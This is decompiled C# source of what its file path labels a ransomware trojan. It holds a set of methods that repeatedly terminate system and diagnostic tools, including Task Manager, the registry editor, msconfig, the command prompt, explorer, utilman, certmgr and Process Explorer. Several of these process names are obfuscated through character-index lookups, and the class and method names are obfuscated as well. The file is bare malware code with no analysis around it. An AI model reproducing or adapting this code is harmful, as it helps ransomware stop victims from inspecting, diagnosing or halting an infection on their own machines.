// Decompiled with JetBrains decompiler
// Type: LOGON.IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
// Assembly: LOGON, Version=1.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: A3BF122D-6FEC-449F-A368-029CC8AC51AA
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan-Ransom.MSIL.Gen.gen-d8d3c4d91a5ca4f0bc22289d479764d4ed00cbb5f780c5a96e26d3ba069a6ff8.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;

namespace LOGON
{
  [StandardModule]
  internal sealed class IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
  {
    public static void IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII()
    {
      try
      {
        string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!?/'";
        Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(str[45]) + Conversions.ToString(str[26]) + Conversions.ToString(str[44]) + Conversions.ToString(str[36]) + Conversions.ToString(str[38]) + Conversions.ToString(str[32]) + Conversions.ToString(str[43]));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII()
    {
      try
      {
        string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!?/'";
        Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(str[43]) + Conversions.ToString(str[30]) + Conversions.ToString(str[32]) + Conversions.ToString(str[30]) + Conversions.ToString(str[29]) + Conversions.ToString(str[34]) + Conversions.ToString(str[45]));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII()
    {
      try
      {
        string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!?/'";
        Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(str[38]) + Conversions.ToString(str[44]) + Conversions.ToString(str[28]) + Conversions.ToString(str[40]) + Conversions.ToString(str[39]) + Conversions.ToString(str[31]) + Conversions.ToString(str[34]) + Conversions.ToString(str[32]));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("utilman");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer5()
    {
      try
      {
        string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!?/'";
        Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(str[28]) + Conversions.ToString(str[38]) + Conversions.ToString(str[29]));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer6()
    {
      try
      {
        string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!?/'";
        Process[] processesByName = Process.GetProcessesByName(Conversions.ToString(str[30]) + Conversions.ToString(str[49]) + Conversions.ToString(str[41]) + Conversions.ToString(str[37]) + Conversions.ToString(str[40]) + Conversions.ToString(str[43]) + Conversions.ToString(str[30]) + Conversions.ToString(str[43]));
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer7()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("certmgr");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer8()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("control");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer9()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("cscript");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer11()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("procexp");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer12()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("procexp64");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Timer13()
    {
      try
      {
        Process[] processesByName = Process.GetProcessesByName("procexp32");
        int index = 0;
        while (index < processesByName.Length)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
